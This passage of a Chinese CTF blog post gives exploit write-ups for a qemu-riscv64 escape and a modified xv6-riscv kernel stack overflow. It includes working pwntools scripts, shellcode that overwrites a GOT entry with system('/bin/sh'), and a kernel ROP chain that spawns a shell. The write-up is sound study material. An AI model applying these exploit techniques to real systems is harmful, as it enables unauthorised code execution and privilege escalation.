class="line"><span class="string">            &quot;mv a0, a1\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;mv a1, a2\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;mv a2, a3\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;mv a3, a4\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;mv a4, a5\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;mv a5, a6\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;ecall\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;ret\\n&quot;</span></span><br><span class="line"><span class="string">    );</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sc1 = gen_shellcode(sc1_src)</span><br><span class="line"><span class="comment"># sc = open(&quot;./sc.bin&quot;, &quot;rb&quot;).read()</span></span><br><span class="line"></span><br><span class="line">sla(io, <span class="string">&quot;wrong&quot;</span>, sc1)</span><br><span class="line"></span><br><span class="line">res = rr(io, <span class="number">2</span>)</span><br><span class="line">lines = res.split(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf_base = <span class="number">0</span></span><br><span class="line">libc_base = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;qemu-riscv64&#x27;</span> <span class="keyword">in</span> l <span class="keyword">and</span> elf_base == <span class="number">0</span>:</span><br><span class="line">        elf_base = <span class="built_in">int</span>(l[:l.find(<span class="string">b&#x27;-&#x27;</span>)], <span class="number">16</span>)</span><br><span class="line">        lg(<span class="string">&quot;elf_base&quot;</span>, elf_base)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;libc-&#x27;</span> <span class="keyword">in</span> l <span class="keyword">and</span> libc_base == <span class="number">0</span>:</span><br><span class="line">        libc_base = <span class="built_in">int</span>(l[:l.find(<span class="string">b&#x27;-&#x27;</span>)], <span class="number">16</span>)</span><br><span class="line">        lg(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;elf_base&quot;</span>, elf_base)</span><br><span class="line"><span class="comment"># elf = ELF(&quot;./qemu-riscv64&quot;)</span></span><br><span class="line"><span class="comment"># elf.address = elf_base</span></span><br><span class="line">got_mprotect = elf_base + <span class="number">0x6a3200</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span>)</span><br><span class="line">libc.address = libc_base</span><br><span class="line">system_addr =  libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sc2_src = <span class="string">&quot;&quot;&quot;#include &lt;linux/unistd.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;sys/uio.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    static char flag_path[] = &quot;./test&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    static uint64_t *ro_base = (uint64_t *) %#x;</span></span><br><span class="line"><span class="string">    static uint64_t *got_ptr = (uint64_t *) %#x;</span></span><br><span class="line"><span class="string">    static uint64_t system_addr = %#x;</span></span><br><span class="line"><span class="string">    static uint64_t binsh_str = 0x68732f6e69622f;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    int syscall(uint64_t nr, ...);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    int _start()&#123;</span></span><br><span class="line"><span class="string">        char buf[0x1000];</span></span><br><span class="line"><span class="string">        syscall(__NR_mprotect, ro_base, 0x3c000, 7);</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        got_ptr[0] = system_addr;</span></span><br><span class="line"><span class="string">        ro_base[0] = binsh_str;</span></span><br><span class="line"><span class="string">        syscall(__NR_mprotect, ro_base, 0x3c000, 7);</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    asm(</span></span><br><span class="line"><span class="string">        &quot;syscall:\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;mv a7, a0\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;mv a0, a1\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;mv a1, a2\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;mv a2, a3\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;mv a3, a4\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;mv a4, a5\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;mv a5, a6\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;ecall\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;ret\\n&quot;</span></span><br><span class="line"><span class="string">    );</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>%(elf_base + <span class="number">0x668000</span>, got_mprotect, system_addr)</span><br><span class="line"></span><br><span class="line">sc2 = <span class="string">b&#x27;\x01\x00&#x27;</span>*<span class="number">0x80</span> + gen_shellcode(sc2_src) <span class="comment"># prefill with nops</span></span><br><span class="line"></span><br><span class="line">sl(io, sc2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="pwn-babyxv6"><a href="#pwn-babyxv6" class="headerlink" title="pwn-babyxv6"></a>pwn-babyxv6</h2><p>一个 riscv kernel pwn . 和之前遇到的 kernel pwn 题不太一样.</p>
<p>之前遇到的 kernel pwn 通常都是加载一个恶意内核模块, 或者有一些错误的系统配置, 选手需要利用漏洞进行提权进而拿到 flag . 而这个题目并没有用户一个 shell. 用户需要利用漏洞拿到一个 shell 进而拿到 flag.</p>
<p>作者在开源 riscv 操作系统: <a target="_blank" rel="noopener" href="https://github.com/mit-pdos/xv6-riscv">xv6-riscv</a> 的基础之上进行了修改. 通过比较源码可以发现作者添加了一个系统调用: <code>sys_baby</code> 该系统调用的实现中中包含一个栈溢出漏洞:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line">do_overflow(uint64 src, <span class="keyword">int</span> sz)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">return</span> copyin(myproc()-&gt;pagetable, buf, src, sz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64</span><br><span class="line">sys_baby(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    uint64 p;</span><br><span class="line">    <span class="keyword">char</span> pad[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argint(<span class="number">1</span>, &amp;n) &lt; <span class="number">0</span> || argaddr(<span class="number">0</span>, &amp;p) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> do_overflow(p, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要逻辑在 <code>src/usr/chall.c</code> 中:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readnum</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">challenge</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> input[<span class="number">0x80</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to babystack 2021!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How many bytes do you want to send?\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    size = readnum();</span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0x1000</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;You are greedy!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;show me your input\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, input, <span class="number">0x80</span>);</span><br><span class="line">    baby(input, size);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s time to say goodbye.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    challenge();</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们要做的就是利用利用  <code>do_overflow</code> 中的栈溢出漏洞 getshell. </p>
<h3 id="系统调用-syscall-和返回流程"><a href="#系统调用-syscall-和返回流程" class="headerlink" title="系统调用(syscall)和返回流程"></a>系统调用(syscall)和返回流程</h3><p>简单来说, riscv 架构中有三种模式, M(Machine mode), S(Supervisor mode) 和 U(User mode). 其中 M 模式权限最高, S 模式次之, 操作系统内核就跑在 S 模式中, U 模式权限最低, 用户代码就跑在 U 模式中. <strong>更多关于 riscv 中特权架构以及一些相关指令和寄存器的定义及作用建议参考 <a target="_blank" rel="noopener" href="http://riscvbook.com/chinese/RISC-V-Reader-Chinese-v2p1.pdf">RISC-V 手册</a> 中第十章.</strong></p>
<p>用户态代码使用 <code>ecall</code> 指令请求内核中的系统调用. 系统调用可以传递 6个参数, 使用 a0-a6 寄存器传递, 系统调用的编号则通过 a7 寄存器传递. 本题中系统调用的编号定义在 <code>src/kernel/syscall.h</code> 文件中.</p>
<p>实际代码实现中大致流程如下:</p>
<ol>
<li>用户态执行 <code>ecall</code> 指令</li>
<li>进入 <code>src/kernel/trampoline.S</code> 中的 <code>trampoline</code><ol>
<li>将各个用户态寄存器保存到 <code>trapframe</code>结构体中</li>
<li>切换到内核态的页表</li>
</ol>
</li>
<li><code>src/kernel/trap.c</code> 中的 <code>usertrap(void)</code></li>
<li><code>src/kernel/syscall.c</code> 中的 <code>syscall(void)</code><ol>
<li>其中会从 <code>trapframe</code> 结构体中获取 a7 寄存器的值, 然后决定调用对应的系统调用函数(如 <code>sys_baby</code>).</li>
<li>对应的系统调用函数中也会从 <code>trapframe</code> 结构体中取寄存器的值作为参数.</li>
</ol>
</li>
<li><code>src/kernel/trap.c</code> 中的 <code>usertrapret(void)</code></li>
<li><code>src/kernel/trampoline.S</code> 中的 <code>userret</code><ol>
<li>切换到用户态的页表</li>
<li>从 <code>trapframe</code> 结构体中恢复各个用户态寄存器</li>
<li>执行 <code>sret</code> 指令返回用户态</li>
</ol>
</li>
</ol>
<p>其中:</p>
<ul>
<li><code>trapframe</code> 结构体的定义见 <code>/src/kernel/proc.h</code>中<code>struct trapframe</code></li>
<li>本题调试发现内核和用户态应该都没有开随机化, 栈地址. 但是调试发现 <code>trapframe</code> 的地址出现过两个值,  原因不详.<ul>
<li><code>0x0000000087f70000</code> </li>
<li><code>0x0000000087f77000</code></li>
</ul>
</li>
</ul>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>qemu 启动命令加上以下参数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-S -gdb tcp::1234</span><br></pre></td></tr></table></figure>

<p>调试脚本如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">gdb-multiarch -q \</span><br><span class="line">  -ex <span class="string">&#x27;set architecture riscv:rv64&#x27;</span> \</span><br><span class="line">  -ex <span class="string">&#x27;file kernel&#x27;</span> \</span><br><span class="line">  -ex <span class="string">&#x27;add-symbol-file _chall&#x27;</span> \</span><br><span class="line">  -ex <span class="string">&#x27;target remote localhost:1234&#x27;</span> \</span><br><span class="line">  -ex <span class="string">&#x27;b sys_baby&#x27;</span> \</span><br><span class="line">  -ex <span class="string">&#x27;b *0x800041fc&#x27;</span> \</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<p>其中:</p>
<ul>
<li><code>add-symbol-file _chall</code> 是为了加载 <code>_chall</code>中的符号, 可以在用户态代码下断点, <code>_chall</code>是通过源码编译得到的.</li>
</ul>
<p>如何实现跟踪从内核模式切换回用户模式(虽然并没有用到, 但还是值得记录一下)</p>
<p>笔者调试时发现, 在 <code>sret</code> 指令出执行 <code>si</code> 指令, 程序就直接跑飞了, 并不会走到用户态中, 为了实现在调试器中跟到用户态的代码, 可以使用如下方法:</p>
<ol>
<li>拿到用户代码中<code>ecall</code>后面指令的地址: <code>target_addr</code></li>
<li>在执行到 <code>sret</code>时先清除所有内核态的断点</li>
<li>再执行 <code>b *target_addr</code>下断点即可.</li>
</ol>
<p><strong>注意</strong>:</p>
<ul>
<li>必须得执行到切换到用户态页表时才能在用户态下断点, 否则 gdb 会报错</li>
<li>切换到用户态页表之后需要把内核态地址的断点删掉, 否则同样会报错</li>
<li>这个方法只能支持一次从内核态跟到用户态, 从用户态进入内核态就跟不回去了….</li>
<li>如果有什么更好的方法欢迎交流.</li>
<li>相关配置:<ul>
<li>系统: ubuntu 20.04</li>
<li>gdb: 9.2</li>
<li>插件: gef</li>
<li></li>
</ul>
</li>
</ul>
<h3 id="rop-getshell"><a href="#rop-getshell" class="headerlink" title="rop getshell"></a>rop getshell</h3><p>因为我们最多只能输入0x80 字节. 所以需要进行一些比较巧妙的构造.</p>
<p>首先我们观察 <code>do_overflow</code> 返回时的寄存器状态:</p>
<ul>
<li>a0 = 0</li>
<li>a1 指向我们的输入</li>
<li>a2 值为输入的长度</li>
</ul>
<p>基于这三个寄存器的值我们有以下思路: 我们如果可以控制a0寄存器, 使其指向 <code>trapframe</code> 结构体, 然后调用 <code>memcpy</code> 函数就可以实现对 <code>trapframe</code> 结构体的修改. 修改之后我们再次返回到 <code>usertrap</code> 函数进行一次系统调用. 此时们可以通过控制 a7 寄存器以及 a0-a6 参数寄存器实现任意系统调用, 那么我们就可以通过 <code>exec(&quot;sh&quot;, argv)</code>  getshell.</p>
<p>首先找到这个gadget</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">80000fac:	fe843783          	ld	a5,-24(s0)</span><br><span class="line">80000fb0:	853e                	mv	a0,a5</span><br><span class="line">80000fb2:	60e2                	ld	ra,24(sp)</span><br><span class="line">80000fb4:	6442                	ld	s0,16(sp)</span><br><span class="line">80000fb6:	6105                	addi	sp,sp,32</span><br><span class="line">80000fb8:	8082                	ret</span><br></pre></td></tr></table></figure>

<p>通过这个 gadget 我们可以控制  a0 寄存器.我们通过覆盖栈上的ra寄存器先从 <code>do_overflow</code> 返回到 <code>80000fac</code> . 通过这个 gadget 我们可以使 a0 指向<code>trapframe+112</code> 处(即 a0 寄存器处). 然后再次控制栈上的 ra 寄存器返回到 <code>80001428</code> (memcpy 开头 add sp; sd ra 之后). 从而利用 memcpy 修改 <code>trapframe</code> 结构体中相关寄存器的值, 使得:</p>
<ul>
<li>a0 指向 “sh\0” (这是一个用户态地址, 因为没有随机化, 所以可以通过调试获得)</li>
<li>a1 需要为合法用户态地址, 且 *a1 = 0</li>
<li>a7 = 7 (exec 的 syscall number)</li>
</ul>
<p>在 memcpy 返回的时候我们再通过控制栈上的 ra 寄存器返回到 <code>usertrap</code> 函数, 即可执行 <code>exec(&quot;sh&quot;, argv) </code>.</p>
<p>GETSHELL!</p>
<h3 id="遇到的一些问题"><a href="#遇到的一些问题" class="headerlink" title="遇到的一些问题"></a>遇到的一些问题</h3><p>使用 mount 挂载 fs.img 报错:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mount -o loop ./fs.img ./rootfs</span><br><span class="line">mount: /home/wxk/babyxv6/rootfs: wrong fs <span class="built_in">type</span>, bad option, bad superblock on /dev/loop6, missing codepage or helper program, or other error.</span><br></pre></td></tr></table></figure>

<p>猜测 fs.img 中的文件系统并不是 x86 linux 所支持的.</p>
<p>但是奇怪的是我用 binwalk 可以识别出但是也无法提取出其中的 elf 文件. 有空问问坤坤啥情况.</p>
<p>还好给了源码, 可以自己编译其中的一些文件, 尤其是 chall.</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>我这个做法属于非预期解. 思路来源于赛后 <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=iQYizRu7jks">科恩组织的分享</a> 中 0ops 的师傅分享的解题思路. 这个思路比出题人的思路更简洁 出题人的思路可以参考<a target="_blank" rel="noopener" href="https://github.com/sixstars/starctf2021/tree/main/pwn-babyxv6">官方wp</a>.</p>
<p>最终 exp 如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">context(bits = <span class="number">64</span>, endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./run.sh&quot;</span>, aslr=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">name, val</span>):</span></span><br><span class="line">    log.info(name+<span class="string">&quot; : &quot;</span>+<span class="built_in">hex</span>(val))</span><br><span class="line"></span><br><span class="line">gad1        = <span class="number">0x80000fac</span></span><br><span class="line">saved_sp    = <span class="number">0x0000003fffffbe80</span> </span><br><span class="line">memcpy_addr = <span class="number">0x80001428</span></span><br><span class="line">usertrap_addr = <span class="number">0x800037ba</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">a0 指向 &quot;/bin/sh\0&quot;</span></span><br><span class="line"><span class="string">a1 需要为合法地址, 且 *a1 = 0</span></span><br><span class="line"><span class="string">a7 = 7 ( exec 的 syscall number )</span></span><br><span class="line"><span class="string">0x0000000000002f28 是用户态栈地址, 指向我们的输入.</span></span><br><span class="line"><span class="string">0x0000000087f70000 是 trapframe 地址</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p1 = flat(</span><br><span class="line">    <span class="number">0x0000000000002f28</span>+<span class="number">0x10</span>, <span class="number">0x0000000000002f28</span>+<span class="number">0x30</span>, </span><br><span class="line">    <span class="string">&quot;sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>), <span class="number">0x0000000087f70000</span> + <span class="number">112</span>,</span><br><span class="line">    saved_sp, <span class="comment"># s0/fp</span></span><br><span class="line">    gad1,</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>,</span><br><span class="line">    saved_sp + <span class="number">0x20</span>,</span><br><span class="line">    memcpy_addr,</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    saved_sp + <span class="number">0x20</span> + <span class="number">0x30</span>,</span><br><span class="line">    usertrap_addr</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sla(io, <span class="string">&quot;want to send?&quot;</span>, <span class="built_in">str</span>(<span class="number">0x80</span>))</span><br><span class="line">sa(io, <span class="string">&quot; input\n&quot;</span>, p1)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;critical&quot;</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>比赛期间由于有别的一些事情, 就做了两道题, 赛后有空再复现一下几个好玩的题目.</p>
<p>很有意思的比赛, 学到了很多新知识2333.</p>
<p>感谢复现过程中@X1do0提供的各种帮助orz.</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><p><a target="_blank" rel="noopener" href="https://developer.arm.com/documentation/dui0801/g/A64-General-Instructions/PACIA--PACIZA--PACIA1716--PACIASP--PACIAZ">ARM Compiler armasm User Guide Version 6.6</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf">ARMv8.3 Pointer Authentication</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://developer.arm.com/documentation/dui0801/g/A64-General-Instructions/PACIA--PACIZA--PACIA1716--PACIASP--PACIAZ">PACIA, PACIZA, PACIA1716, PACIASP, PACIAZ</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://developer.arm.com/documentation/dui0801/k/A64-General-Instructions/RETAA--RETAB?lang=en">RETAA, RETAB</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39869547/article/details/105255683">ARM64下ROP，以及调试技巧总结</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/sixstars/starctf2021">official writeup</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://ghidra-sre.org/">ghidra官网</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/01/22/riscv/#">宇轩大佬的wp</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/01/22/riscv/#">mips64调试环境搭建</a></p>
</li>
<li><p><a href="https://pullp.github.io/2021/01/30/shellcode-tips/">shellcode tips – wxk199’s blog</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/mit-pdos/xv6-riscv">xv6-riscv</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="http://riscvbook.com/chinese/RISC-V-Reader-Chinese-v2p1.pdf">RISC-V 手册</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=iQYizRu7jks">科恩高校合作传统pwn方向第一次活动</a></p>
</li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/ctf/" rel="tag"># ctf</a>
              <a href="/tags/pwn/" rel="tag"># pwn</a>
              <a href="/tags/re/" rel="tag"># re</a>
              <a href="/tags/riscv/" rel="tag"># riscv</a>
              <a href="/tags/arm/" rel="tag"># arm</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/01/01/handle%E5%8D%8F%E8%AE%AE%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" rel="prev" title="handle认证(Authentication)流程分析">
                  <i class="fa fa-chevron-left"></i> handle认证(Authentication)流程分析
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/01/29/debug-tips/" rel="next" title="debug tips">
                  debug tips <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments gitalk-container"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">wxk1997</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  




  




<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

